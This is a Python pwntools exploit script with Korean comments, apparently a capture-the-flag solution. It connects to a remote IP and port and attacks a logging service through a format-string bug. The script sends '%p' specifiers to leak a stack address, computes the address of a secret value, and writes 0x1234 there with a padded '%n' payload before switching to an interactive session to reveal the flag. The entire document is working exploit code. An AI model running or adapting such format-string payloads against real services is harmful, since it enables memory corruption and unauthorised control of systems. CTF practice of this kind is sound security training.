# Exploit_Stage3.py

from pwn import *

# 1. 서버 연결
p = remote('128.134.83.160', 41403)

# 2. 사용자 입력
p.sendlineafter(b"Enter your user ID:", b"potato")
p.sendlineafter(b"Choice:", b"2")

# 3. 포맷 스트링 전송 (leak)
p.sendline(b"AAAA" + b"%p " * 8)

# 4. 출력 받기
p.recvuntil(b"Log entry: AAAA")
response = p.recvline().strip()

# 5. leak 주소 추출
leaks = response.split(b' ')[0]
leaked_addr = int(leaks, 16)
log.info(f"[*] Leaked base addr = {hex(leaked_addr)}")

# 6. target 주소 계산
offset = 0x70  # local 기준 유출된 부분 주소와 secret token 사이의 offset
target_addr = leaked_addr + offset + 4
log.info(f"[*] Target address = {hex(target_addr)}")

# 7. 쓸 값 설정
target_val = 0x00001234

# 8. payload 구성
written = 46
# p32(target_addr) + timestamp로 인한 헤더 길이 42
# [2025-05-21 15:51:32] [potato] Log entry: 공백 포함 총 42글자임.
padding = target_val - written

payload  = p32(target_addr)
payload += '%{}c'.format(padding).encode()
payload += b'%5$n'

# 9. write payload 실행
p.sendlineafter(b"Choice:", b"2")
p.sendline(payload)

# 10. interactive
log.info("[*] Payload sent. Switching to interactive mode. Try 'Choice: 4' to reveal the flag.")
p.interactive()
